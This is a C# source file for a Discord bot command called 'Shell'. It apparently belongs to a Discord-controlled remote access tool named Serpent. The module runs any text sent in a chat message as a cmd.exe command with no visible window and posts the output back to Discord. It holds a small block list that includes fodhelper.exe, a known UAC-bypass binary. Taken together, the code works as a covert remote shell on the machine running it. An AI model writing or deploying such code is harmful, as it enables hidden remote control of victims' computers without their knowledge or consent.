using System;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using Helper;

namespace Commands
{
    public static class Shell
    {
        private static readonly string[] NotUsableCommands = { "tasklist", "powershell.exe", "fodhelper.exe" };

        public static async Task Run(SocketUserMessage message, string[] args)
        {
            if (NotUsableCommands.Contains(args[0]) || string.Join(" ", args).Length > 2000)
            {
                Embed embed = new SerpentEmbed().GetEmbed(SerpentEmbeds.Warning, "", $"Command ``{args[0]}`` cannot be used due to its big output size.");
                await message.ReplyAsync(embed: embed);
                return;
            }

            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + string.Join(" ", args),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            try
            {
                await Task.Run(async () =>
                {
                    using (Process shell = new Process { StartInfo = startInfo })
                    {
                        shell.Start();
                        shell.WaitForExit();

                        string output = await shell.StandardOutput.ReadToEndAsync();
                        string errorOutput = await shell.StandardError.ReadToEndAsync();
                        string sent = string.IsNullOrEmpty(output) ? errorOutput : output;
                        string final = string.IsNullOrEmpty(sent) ? "None" : sent;

                        Embed embedToSend = new SerpentEmbed().GetEmbed(SerpentEmbeds.Success, $"Result of {args[0]}", $"```py\n{final}```");
                        await message.ReplyAsync(embed: embedToSend);
                    }
                });
            }
            catch (Exception e)
            {
                Console.WriteLine("Error.");
            }
        }
    }
}